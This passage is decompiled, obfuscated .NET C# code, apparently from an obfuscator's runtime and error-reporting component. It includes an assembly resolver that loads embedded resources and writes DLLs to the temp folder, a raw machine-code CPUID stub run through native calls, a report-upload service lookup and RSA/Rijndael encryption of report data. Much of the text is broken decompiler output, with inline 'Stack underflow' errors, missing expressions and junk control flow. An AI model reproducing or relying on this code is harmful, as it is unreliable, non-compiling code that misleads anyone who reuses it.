				_0011._0001(ex3, (object)uploadReportLoginService, (object)ex2, (object)P_0, (object)P_1);
				throw;
			}
		}

		static _000E _0001()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			IDisposable disposable = default(IDisposable);
			_000E obj = default(_000E);
			try
			{
				if (0 == 0)
				{
					if (0 == 0)
					{
						_0011._0001();
						if (6u != 0)
						{
							disposable = (IDisposable)/*Error near IL_0041: Stack underflow*/;
						}
						try
						{
							_0011._0001();
							obj = (_000E)/*Error near IL_001a: Stack underflow*/;
						}
						finally
						{
							do
							{
								if (disposable != null)
								{
									global::_000F._007E_0099(disposable);
								}
							}
							while (false);
						}
					}
					goto IL_0030;
				}
				goto IL_0034;
				IL_0030:
				if (0 == 0)
				{
					_000E obj2 = (_000E)/*Error near IL_0047: Stack underflow*/;
				}
				goto IL_0034;
				IL_0034:
				if (2 == 0)
				{
					goto IL_0030;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)disposable, (object)obj);
				throw;
			}
			return (_000E)/*Error near IL_0055: Stack underflow*/;
		}

		unsafe static Assembly _0001(object _0002, ResolveEventArgs _0003)
		{
			//IL_02ba: Incompatible stack heights: 0 vs 2
			//IL_02c4: Incompatible stack heights: 0 vs 1
			//IL_02d8: Incompatible stack heights: 0 vs 1
			//IL_02e8: Incompatible stack heights: 0 vs 1
			//IL_02ee: Incompatible stack heights: 0 vs 1
			//IL_02f8: Incompatible stack heights: 0 vs 1
			if (true)
			{
				void* ptr = stackalloc byte[16];
				global::_0008._0001._0001 obj = default(global::_0008._0001._0001);
				string text = default(string);
				string text2 = default(string);
				string[] array = default(string[]);
				string text3 = default(string);
				bool flag = default(bool);
				bool flag2 = default(bool);
				Dictionary<string, Assembly> dictionary = default(Dictionary<string, Assembly>);
				Stream manifestResourceStream = default(Stream);
				byte[] array2 = default(byte[]);
				Assembly assembly = default(Assembly);
				string text5 = default(string);
				string text6 = default(string);
				Assembly assembly2 = default(Assembly);
				try
				{
					_ = ref obj;
					_ = ((ResolveEventArgs)/*Error near IL_02c4: Stack underflow*/).Name;
					*(global::_0008._0001._0001*)/*Error near IL_02ce: Stack underflow*/ = new global::_0008._0001._0001((string)/*Error near IL_02ce: Stack underflow*/);
					do
					{
						obj._0001(_0002: false);
						if (0 == 0)
						{
							text = (string)/*Error near IL_02de: Stack underflow*/;
						}
						_ = Encoding.UTF8;
						((Encoding)/*Error near IL_02f8: Stack underflow*/).GetBytes((string)/*Error near IL_02f8: Stack underflow*/);
						text2 = Convert.ToBase64String((byte[])/*Error near IL_0044: Stack underflow*/);
						array = "ezcwNWE5NzE4LTMzNGEtNDIxMC05ODA0LThmMTZmOGQzODdhNX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{5cf3ab52-b8f9-438e-8f88-54f44cae52d7},ezcwNWE5NzE4LTMzNGEtNDIxMC05ODA0LThmMTZmOGQzODdhNX0=,[z]{5cf3ab52-b8f9-438e-8f88-54f44cae52d7}".Split(new char[1] { ',' });
						text3 = string.Empty;
						flag = false;
						flag2 = false;
						*(int*)ptr = 0;
						while (*(int*)ptr < array.Length - 1)
						{
							if (array[*(int*)ptr] == text2)
							{
								text3 = array[*(int*)ptr + 1];
								break;
							}
							*(int*)ptr += 2;
						}
						if (text3.Length != 0 || obj._0003.Length != 0)
						{
							continue;
						}
						text2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj._0001));
						*(int*)((byte*)ptr + 4) = 0;
						while (*(int*)((byte*)ptr + 4) < array.Length - 1)
						{
							if (array[*(int*)((byte*)ptr + 4)] == text2)
							{
								text3 = array[*(int*)((byte*)ptr + 4) + 1];
								break;
							}
							*(int*)((byte*)ptr + 4) += 2;
						}
					}
					while (false);
					if (text3.Length > 0)
					{
						if (text3[0] == '[')
						{
							*(int*)((byte*)ptr + 8) = text3.IndexOf(']');
							string text4 = text3.Substring(1, *(int*)((byte*)ptr + 8) - 1);
							flag = text4.IndexOf('z') >= 0;
							flag2 = text4.IndexOf('t') >= 0;
							text3 = text3.Substring(*(int*)((byte*)ptr + 8) + 1);
						}
						dictionary = global::_0008._0001._0001;
						Monitor.Enter(dictionary);
						try
						{
							while (true)
							{
								if (!global::_0008._0001._0001.ContainsKey(text3))
								{
									if (4u != 0)
									{
										manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text3);
										if (manifestResourceStream == null)
										{
											break;
										}
										if (false)
										{
											continue;
										}
										*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
										array2 = new byte[*(int*)((byte*)ptr + 12)];
									}
									manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
									if (flag)
									{
										array2 = _0011._0001(array2);
									}
									assembly = null;
									if (1 == 0)
									{
										continue;
									}
									if (!flag2)
									{
										try
										{
											assembly = Assembly.Load(array2);
										}
										catch (FileLoadException)
										{
											flag2 = true;
										}
										catch (BadImageFormatException)
										{
											if (true)
											{
												flag2 = true;
											}
										}
									}
									if (0 == 0)
									{
										if (flag2)
										{
											try
											{
												text5 = $"{Path.GetTempPath()}{text3}\\";
												Directory.CreateDirectory(text5);
												text6 = text5 + obj._0001 + ".dll";
												if (!File.Exists(text6))
												{
													FileStream fileStream = File.OpenWrite(text6);
													fileStream.Write(array2, 0, array2.Length);
													fileStream.Close();
													_0011._0001(text6, (string)null, 4);
													_0011._0001(text5, (string)null, 4);
												}
												assembly = Assembly.LoadFile(text6);
											}
											catch
											{
											}
										}
										global::_0008._0001._0001[text3] = assembly;
										assembly2 = assembly;
										return assembly2;
									}
								}
								assembly2 = global::_0008._0001._0001[text3];
								return assembly2;
							}
						}
						finally
						{
							do
							{
								Monitor.Exit(dictionary);
							}
							while (false);
						}
					}
					return null;
				}
				catch (Exception ex3)
				{
					_0011._0001(ex3, new object[20]
					{
						obj,
						text,
						text2,
						array,
						text3,
						flag,
						flag2,
						*(int*)ptr,
						*(int*)((byte*)ptr + 4),
						*(int*)((byte*)ptr + 8),
						dictionary,
						manifestResourceStream,
						assembly2,
						*(int*)((byte*)ptr + 12),
						array2,
						assembly,
						text5,
						text6,
						_0002,
						_0003
					});
					throw;
				}
			}
			Assembly result;
			return result;
		}

		unsafe static bool _0001()
		{
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_0045: Incompatible stack heights: 0 vs 2
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 2
			int num;
			if (uint.MaxValue != 0)
			{
				num = 2;
				goto IL_0004;
			}
			goto IL_0073;
			IL_0004:
			void* ptr = stackalloc byte[num];
			Mutex mutex = default(Mutex);
			try
			{
				do
				{
					_ = 1;
					global::_000E._0003._0001(107393811);
					new Mutex((byte)/*Error near IL_004f: Stack underflow*/ != 0, (string?)/*Error near IL_004f: Stack underflow*/, out *(bool*)/*Error near IL_004f: Stack underflow*/);
					mutex = (Mutex)/*Error near IL_0052: Stack underflow*/;
				}
				while (7 == 0);
				if (false)
				{
					goto IL_002b;
				}
				if (*(sbyte*)(nint)/*Error near IL_0023: Stack underflow*/ == 0)
				{
					*(sbyte*)(nint)(/*Error near IL_0029: Stack underflow*/ + 1) = 0;
					goto IL_002b;
				}
				_ = _0092_0002._001D_0005;
				/*Error near IL_0062: Stack underflow*/((object)/*Error near IL_0062: Stack underflow*/);
				((byte*)ptr)[1] = 1;
				goto end_IL_000c;
				IL_002b:
				if (false)
				{
				}
				end_IL_000c:;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(bool*)ptr), (object)mutex);
				throw;
			}
			goto IL_0073;
			IL_0073:
			num = ((byte*)ptr)[1];
			if (5u != 0)
			{
				return (byte)num != 0;
			}
			goto IL_0004;
		}

		unsafe static bool _0001(ref byte[] P_0)
		{
			//IL_0118: Incompatible stack heights: 0 vs 1
			//IL_0128: Incompatible stack heights: 0 vs 1
			//IL_012e: Incompatible stack heights: 0 vs 2
			//IL_013e: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[5];
			byte[] array2 = default(byte[]);
			byte[] array3 = default(byte[]);
			IntPtr intPtr = default(IntPtr);
			IntPtr intPtr4 = default(IntPtr);
			try
			{
				byte[] array = new byte[26];
				if (0 == 0)
				{
					RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				}
				array2 = array;
				_ = new byte[19]
				{
					83, 72, 199, 192, 1, 0, 0, 0, 15, 162,
					65, 137, 0, 65, 137, 80, 4, 91, 195
				};
				array3 = (byte[])/*Error near IL_011e: Stack underflow*/;
				if (0 == 0)
				{
					_0011._0001();
					if ((int)/*Error near IL_0044: Stack underflow*/ != 0)
					{
						_ = ref intPtr;
						IntPtr intPtr2 = (nint)((Array)/*Error near IL_004c: Stack underflow*/).LongLength;
						*(IntPtr*)/*Error near IL_0138: Stack underflow*/ = new IntPtr((int)(nint)intPtr2);
						if (!_0011._0001(_0003: intPtr, _0002: (byte[])/*Error near IL_0060: Stack underflow*/, _0004: 64, _0005: out *(int*)ptr))
						{
							_007F_0002._008A_0004(_0098_0002._0083_0005());
						}
						intPtr = new IntPtr(P_0.Length);
						((byte*)ptr)[4] = (_0080._0002_0003(_0011._0001(array3, IntPtr.Zero, 0, P_0, intPtr), IntPtr.Zero) ? ((byte)1) : ((byte)0));
					}
					else
					{
						intPtr4 = new IntPtr(array2.Length);
						if (!_0011._0001(array2, intPtr4, 64, out *(int*)ptr))
						{
							_007F_0002._008A_0004(_0098_0002._0083_0005());
						}
						intPtr4 = new IntPtr(P_0.Length);
						((byte*)ptr)[4] = (_0080._0002_0003(_0011._0001(array2, IntPtr.Zero, 0, P_0, intPtr4), IntPtr.Zero) ? ((byte)1) : ((byte)0));
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)array2, (object)array3, (object)(nint)intPtr, (object)(nint)intPtr4, (object)P_0);
				throw;
			}
			return ((byte*)ptr)[4] != 0;
		}

		static string _0001(string P_0)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			_ = _000E_0002._007E_0014_0004;
			global::_000E._0003._0001(107393274);
			/*Error near IL_0041: Stack underflow*/((object)/*Error near IL_0041: Stack underflow*/, (string)/*Error near IL_0041: Stack underflow*/);
			if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
			{
				_ = _000E_0002._007E_0015_0004;
				global::_000E._0003._0001(107393221);
				/*Error near IL_0052: Stack underflow*/((object)/*Error near IL_0052: Stack underflow*/, (string)/*Error near IL_0052: Stack underflow*/);
				while ((int)/*Error near IL_0024: Stack underflow*/ != 0)
				{
					if (107393232u != 0)
					{
						global::_000E._0003._0001((int)/*Error near IL_0059: Stack underflow*/);
						return (string)/*Error near IL_002f: Stack underflow*/;
					}
				}
			}
			return (string)/*Error near IL_0032: Stack underflow*/;
		}

		unsafe static global::_0002._0003 _0001(UIntPtr _0002, global::_0008._0003 _0003, global::_0001._0005 _0004, string _0005, out global::_0008._0002 _0006)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			_009C_0003_009E_0006._001F_0004_0006((UIntPtr)/*Error near IL_0022: Stack underflow*/, (global::_0008._0003)/*Error near IL_0022: Stack underflow*/, (global::_0001._0005)/*Error near IL_0022: Stack underflow*/, (string)/*Error near IL_0022: Stack underflow*/, out *(global::_0008._0002*)/*Error near IL_0022: Stack underflow*/);
			return (global::_0002._0003)/*Error near IL_000d: Stack underflow*/;
		}

		static Assembly[] _0001(global::_0002._0005 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 2
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _001B_0002._007E_0082_0004;
				_001A_0002._0081_0004();
				/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
				Assembly[] array = (Assembly[])/*Error near IL_0021: Stack underflow*/;
			}
			catch
			{
				Assembly[] array = new Assembly[1] { _0011._0001() };
			}
			return (Assembly[])/*Error near IL_0038: Stack underflow*/;
		}

		static void _0001(global::_0002._0007 P_0, global::_0004._0006 P_1)
		{
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00c1: Incompatible stack heights: 0 vs 1
			//IL_00c7: Incompatible stack heights: 0 vs 2
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00dd: Incompatible stack heights: 0 vs 1
			//IL_00e3: Incompatible stack heights: 0 vs 1
			//IL_0149: Incompatible stack heights: 0 vs 1
			if (((global::_0002._0007)/*Error near IL_000a: Stack underflow*/)._0003 == null)
			{
				try
				{
					if (0 == 0)
					{
						new UploadReportLoginService();
						UploadReportLoginService uploadReportLoginService = (UploadReportLoginService)/*Error near IL_00bb: Stack underflow*/;
					}
					if (((global::_0002._0007)/*Error near IL_0026: Stack underflow*/)._0001 != null)
					{
						goto IL_0028;
					}
					goto IL_0045;
					IL_0028:
					_ = _0096_0002._007E_0081_0005;
					IWebProxy webProxy = ((global::_0002._0007)/*Error near IL_003c: Stack underflow*/)._0001;
					if (7u != 0)
					{
						/*Error near IL_00d7: Stack underflow*/((object)/*Error near IL_00d7: Stack underflow*/, webProxy);
					}
					goto IL_0045;
					IL_0045:
					if (3u != 0)
					{
						if (false)
						{
							goto IL_0028;
						}
						string licenseID = P_0._0002;
						string serverURL = ((UploadReportLoginService)/*Error near IL_0060: Stack underflow*/).GetServerURL(licenseID);
						((global::_0002._0007)/*Error near IL_0065: Stack underflow*/)._0003 = serverURL;
					}
					if (global::_0001._007E_0001(P_0._0003) == 0)
					{
						throw new ApplicationException(global::_000E._0003._0001(107393856));
					}
					if (global::_0008._0095(P_0._0003, global::_000E._0003._0001(107393847)))
					{
						P_0._0003 = global::_0002._0007._0001;
					}
				}
				catch (Exception ex)
				{
					if (0 == 0)
					{
						P_1(global::_0004._0019(global::_000E._0003._0001(107393806), global::_0007._007E_008D(ex)));
					}
					return;
				}
			}
			P_1(_000E_0002._007E_0014_0004(P_0._0003, global::_000E._0003._0001(107393821)) ? P_0._0003 : global::_000E._0003._0001(107393816));
		}

		static byte[] _0001()
		{
			//IL_0028: Incompatible stack heights: 0 vs 2
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0046: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					_ = _0099_0002._007E_0087_0005;
					_0011._0001();
					global::_000E._0003._0001(107393127);
					CultureInfo cultureInfo = global::_0010._0001._0001;
					/*Error near IL_0036: Stack underflow*/((object)/*Error near IL_0036: Stack underflow*/, (string)/*Error near IL_0036: Stack underflow*/, cultureInfo);
					byte[] obj = (byte[])/*Error near IL_0016: Stack underflow*/;
					if (0 == 0)
					{
						byte[] array = obj;
					}
				}
				while (false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (byte[])/*Error near IL_0045: Stack underflow*/;
		}

		unsafe static int _0001(global::_0008._0004._000E P_0, byte[] P_1, int P_2, int P_3)
		{
			//IL_00ef: Incompatible stack heights: 0 vs 1
			//IL_00f5: Incompatible stack heights: 0 vs 1
			//IL_00fb: Incompatible stack heights: 0 vs 2
			//IL_0101: Incompatible stack heights: 0 vs 1
			//IL_0107: Incompatible stack heights: 0 vs 1
			//IL_010d: Incompatible stack heights: 0 vs 1
			//IL_0113: Incompatible stack heights: 0 vs 1
			//IL_0119: Incompatible stack heights: 0 vs 2
			int num = 8;
			if (num != 0)
			{
				void* ptr = stackalloc byte[num];
				try
				{
					int num2 = ((global::_0008._0004._000E)/*Error near IL_0019: Stack underflow*/)._0003;
					if (0 == 0)
					{
						if (num2 >= 8)
						{
							_ = ((global::_0008._0004._000E)/*Error near IL_0029: Stack underflow*/)._0001;
							int num3 = ((global::_0008._0004._000E)/*Error near IL_003d: Stack underflow*/)._0002;
							*(int*)(nint)/*Error near IL_003e: Stack underflow*/ = num3;
							int num4 = *(int*)(nint)/*Error near IL_0044: Stack underflow*/;
							((global::_0008._0004._000E)/*Error near IL_004b: Stack underflow*/)._0002 = num4 + 1;
							_ = *(int*)(nint)/*Error near IL_0051: Stack underflow*/;
							uint num5 = ((global::_0008._0004._000E)/*Error near IL_005b: Stack underflow*/)._0001;
							((sbyte[])/*Error near IL_005d: Stack underflow*/)[/*Error near IL_005d: Stack underflow*/] = (sbyte)(byte)num5;
							P_0._0001 >>= 8;
							P_0._0003 -= 8;
						}
						if (2 == 0)
						{
							goto IL_00c5;
						}
						num2 = P_3;
					}
					int num6 = P_0._0002 - P_0._0001;
					if (0 == 0)
					{
						if (num2 <= num6)
						{
							goto IL_00c5;
						}
						num2 = P_0._0002;
						num6 = P_0._0001;
					}
					P_3 = num2 - num6;
					Array.Copy(P_0._0001, P_0._0001, P_1, P_2, P_3);
					do
					{
						P_0._0001 = 0;
					}
					while (3 == 0);
					P_0._0002 = 0;
					goto IL_00e7;
					IL_00e7:
					*(int*)((byte*)ptr + 4) = P_3;
					goto end_IL_000f;
					IL_00c5:
					Array.Copy(P_0._0001, P_0._0001, P_1, P_2, P_3);
					P_0._0001 += P_3;
					goto IL_00e7;
					end_IL_000f:;
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)(*(int*)ptr), (object)P_0, (object)P_1, (object)P_2, (object)P_3);
					throw;
				}
				num = *(int*)((byte*)ptr + 4);
			}
			return num;
		}

		static string _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			_0011._0001();
			return ((global::_0006._0004._0002)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static short _0001(int P_0)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Incompatible stack heights: 0 vs 2
			//IL_0052: Incompatible stack heights: 0 vs 3
			//IL_0055: Incompatible stack heights: 0 vs 3
			//IL_0058: Incompatible stack heights: 0 vs 3
			//IL_006e: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0008._0004._0007._0001;
				_003F val = /*Error near IL_000a: Stack underflow*/& 0xF;
				int num = ((byte[])/*Error near IL_000b: Stack underflow*/)[val];
				if (true)
				{
					num <<= 12;
				}
				int num3;
				if (0 == 0)
				{
					_ = global::_0008._0004._0007._0001;
					_003F val2 = /*Error near IL_001d: Stack underflow*/>> 4;
					int num2 = ((byte[])/*Error near IL_0021: Stack underflow*/)[val2 & 0xF];
					do
					{
						num2 <<= 8;
					}
					while (-1 == 0);
					num3 = /*Error near IL_0027: Stack underflow*/| num2;
					goto IL_0027;
				}
				goto IL_0043;
				IL_0043:
				num3 = (short)num;
				if (false ? true : false)
				{
					goto IL_0027;
				}
				short num4 = (short)num3;
				goto end_IL_0000;
				IL_0027:
				_ = global::_0008._0004._0007._0001;
				_003F val3 = /*Error near IL_0030: Stack underflow*/>> 8;
				byte num5 = ((byte[])/*Error near IL_0034: Stack underflow*/)[val3 & 0xF];
				_ = /*Error near IL_0037: Stack underflow*/| (num5 << 4);
				_ = global::_0008._0004._0007._0001;
				_003F val4 = /*Error near IL_0041: Stack underflow*/>> 12;
				byte num6 = ((byte[])/*Error near IL_0042: Stack underflow*/)[val4];
				num = /*Error near IL_0043: Stack underflow*/| num6;
				goto IL_0043;
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (short)/*Error near IL_006d: Stack underflow*/;
		}

		static byte[] _0001(byte[] P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 3
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			try
			{
				_ = null;
				_ = null;
				_0011._0001((byte[])/*Error near IL_0013: Stack underflow*/, (byte[])/*Error near IL_0013: Stack underflow*/, (byte[])/*Error near IL_0013: Stack underflow*/, global::_0010._0004._0002);
				byte[] array = (byte[])/*Error near IL_0016: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte[])/*Error near IL_0023: Stack underflow*/;
		}

		static void _0001(global::_0007._0005 P_0, string P_1, global::_0008._0006 P_2)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			try
			{
				string empty = string.Empty;
				if (0 == 0)
				{
					_0011._0001((global::_0008._0006)/*Error near IL_0022: Stack underflow*/, (global::_0007._0005)/*Error near IL_0022: Stack underflow*/, (string)/*Error near IL_0022: Stack underflow*/, empty);
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_2, (object)P_0, (object)P_1);
				throw;
			}
		}

		static void _0001(global::_0008._0004._0003 P_0, int P_1, int P_2)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I4, but got Unknown
			//IL_001c: Expected I4, but got Unknown
			//IL_0026: Invalid comparison between Unknown and I4
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_005f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0061: Expected I4, but got Unknown
			//IL_00e1: Incompatible stack heights: 0 vs 1
			//IL_00e7: Incompatible stack heights: 0 vs 1
			//IL_00ed: Incompatible stack heights: 0 vs 2
			//IL_00f3: Incompatible stack heights: 0 vs 1
			//IL_00fd: Incompatible stack heights: 0 vs 1
			//IL_0103: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 2
			//IL_010f: Expected I4, but got Unknown
			//IL_0115: Incompatible stack heights: 0 vs 2
			int num = default(int);
			int num3 = default(int);
			int num4 = default(int);
			try
			{
				_ = ((global::_0008._0004._0003)/*Error near IL_000f: Stack underflow*/)._0002;
				_003F val = /*Error near IL_0015: Stack underflow*/+ /*Error near IL_0015: Stack underflow*/;
				num = (int)val;
				((global::_0008._0004._0003)/*Error near IL_001c: Stack underflow*/)._0002 = (int)val;
				if ((int)/*Error near IL_0028: Stack underflow*/ > 32768)
				{
					new InvalidOperationException();
					throw /*Error near IL_002e: Stack underflow*/;
				}
				int num2;
				if (6u != 0)
				{
					num2 = ((global::_0008._0004._0003)/*Error near IL_003b: Stack underflow*/)._0001;
					goto IL_0040;
				}
				goto IL_0061;
				IL_00d6:
				_0011._0001(P_0, num3, P_1);
				return;
				IL_0040:
				_003F val2 = /*Error near IL_0041: Stack underflow*/- /*Error near IL_0041: Stack underflow*/;
				do
				{
					val2 &= 0x7FFF;
				}
				while (7 == 0);
				num3 = (int)val2;
				if (0 == 0)
				{
					_ = 32768;
					num4 = /*Error near IL_0060: Stack underflow*/- /*Error near IL_0060: Stack underflow*/;
					goto IL_0061;
				}
				goto IL_00d6;
				IL_0074:
				num2 = P_1;
				if (-1 == 0)
				{
					goto IL_0040;
				}
				if (num2 <= P_2)
				{
					Array.Copy(P_0._0001, num3, P_0._0001, P_0._0001, P_1);
					goto IL_0094;
				}
				while (P_1-- > 0)
				{
					byte[] array = P_0._0001;
					num = P_0._0001++;
					array[num] = P_0._0001[num3++];
				}
				return;
				IL_0061:
				while (num3 <= num4)
				{
					if (0 == 0)
					{
						if (P_0._0001 >= num4)
						{
							break;
						}
						if (false)
						{
							continue;
						}
						goto IL_0074;
					}
					goto IL_0094;
				}
				goto IL_00d6;
				IL_0094:
				P_0._0001 += P_1;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num3, (object)num4, (object)num, (object)P_0, (object)P_1, (object)P_2);
				throw;
			}
		}

		static Icon _0001()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			try
			{
				if (true)
				{
					_0011._0001();
					Icon val = (Icon)/*Error near IL_0011: Stack underflow*/;
				}
			}
			catch (Exception)
			{
				Icon val = _0011._0001(global::_000E._0003._0001(107393138));
			}
			return (Icon)/*Error near IL_0029: Stack underflow*/;
		}

		static void _0001(string P_0)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			global::_0002._0010 obj = default(global::_0002._0010);
			try
			{
				do
				{
					if (8 == 0)
					{
						continue;
					}
					new global::_0002._0010();
					obj = (global::_0002._0010)/*Error near IL_0025: Stack underflow*/;
					do
					{
						if (3u != 0)
						{
							_0011._0001((global::_0003._0008)/*Error near IL_0032: Stack underflow*/, (string)/*Error near IL_0032: Stack underflow*/);
						}
					}
					while (2 == 0);
				}
				while ((5 == 0) ? true : false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)obj, (object)P_0);
				throw;
			}
		}

		static byte[] _0001(byte[] P_0, string P_1)
		{
			//IL_0250: Incompatible stack heights: 0 vs 1
			//IL_02c4: Incompatible stack heights: 0 vs 2
			//IL_02ce: Incompatible stack heights: 0 vs 1
			//IL_02d8: Incompatible stack heights: 0 vs 1
			//IL_02e2: Incompatible stack heights: 0 vs 1
			_ = _000E_0002._007E_0014_0004;
			global::_000E._0003._0001(107396052);
			/*Error near IL_02d8: Stack underflow*/((object)/*Error near IL_02d8: Stack underflow*/, (string)/*Error near IL_02d8: Stack underflow*/);
			if ((int)/*Error near IL_001b: Stack underflow*/ != 0)
			{
				global::_000E._0003._0001(107393093);
				global::_000E._0004._0001 = (string)/*Error near IL_002a: Stack underflow*/;
				if (0 == 0)
				{
					return null;
				}
			}
			RijndaelManaged rijndaelManaged = null;
			RSACryptoServiceProvider rSACryptoServiceProvider = null;
			MemoryStream memoryStream = null;
			CryptoStream cryptoStream = null;
			try
			{
				new RijndaelManaged();
				rijndaelManaged = (RijndaelManaged)/*Error near IL_004d: Stack underflow*/;
				rSACryptoServiceProvider = new RSACryptoServiceProvider();
				global::_0011._007E_001E_0002(rSACryptoServiceProvider, P_1);
				global::_000F._007E_0002_0002(rijndaelManaged);
				if (8u != 0)
				{
					global::_000F._007E_0003_0002(rijndaelManaged);
					byte[] array = new byte[48];
					_0093_0002._001E_0005(_0007_0002._007E_0011_0004(rijndaelManaged), 0, array, 0, 32);
					_0093_0002._001E_0005(_0007_0002._007E_0012_0004(rijndaelManaged), 0, array, 32, 16);
					memoryStream = new MemoryStream();
					try
					{
						byte[] array2 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, array, false);
						_009B_0002._007E_0089_0005(memoryStream, 1);
						_009B_0002._007E_0089_0005(memoryStream, _009C_0002._008A_0005(array2.Length / 8));
						_0088_0002._007E_0005_0005(memoryStream, array2, 0, array2.Length);
					}
					catch (CryptographicException)
					{
						try
						{
							byte[] array3 = new byte[16];
							byte[] array4 = new byte[16];
							_0093_0002._001E_0005(_0007_0002._007E_0011_0004(rijndaelManaged), 0, array3, 0, 16);
							_0093_0002._001E_0005(_0007_0002._007E_0011_0004(rijndaelManaged), 16, array4, 0, 16);
							byte[] array5 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, array3, false);
							byte[] array6;
							byte[] array7;
							if (0 == 0)
							{
								array6 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, array4, false);
								array7 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, _0007_0002._007E_0012_0004(rijndaelManaged), false);
								_009B_0002._007E_0089_0005(memoryStream, 2);
								_009B_0002._007E_0089_0005(memoryStream, _009C_0002._008A_0005(array5.Length / 8));
								_0088_0002._007E_0005_0005(memoryStream, array5, 0, array5.Length);
							}
							_0088_0002._007E_0005_0005(memoryStream, array6, 0, array6.Length);
							_0088_0002._007E_0005_0005(memoryStream, array7, 0, array7.Length);
						}
						catch (CryptographicException)
						{
							global::_000E._0004._0001 = global::_000E._0003._0001(107393512);
							return null;
						}
					}
					cryptoStream = new CryptoStream(memoryStream, _009D_0002._007E_008B_0005(rijndaelManaged), CryptoStreamMode.Write);
				}
				_0088_0002._007E_0005_0005(cryptoStream, P_0, 0, P_0.Length);
				global::_000F._007E_0004_0002(cryptoStream);
				return _0007_0002._007E_0010_0004(memoryStream);
			}
			catch (Exception ex3)
			{
				global::_000E._0004._0001 = global::_0004._0019(global::_000E._0003._0001(107393338), global::_0007._007E_008D(ex3));
				return null;
			}
			finally
			{
				if (rijndaelManaged != null)
				{
					goto IL_0284;
				}
				goto IL_028f;
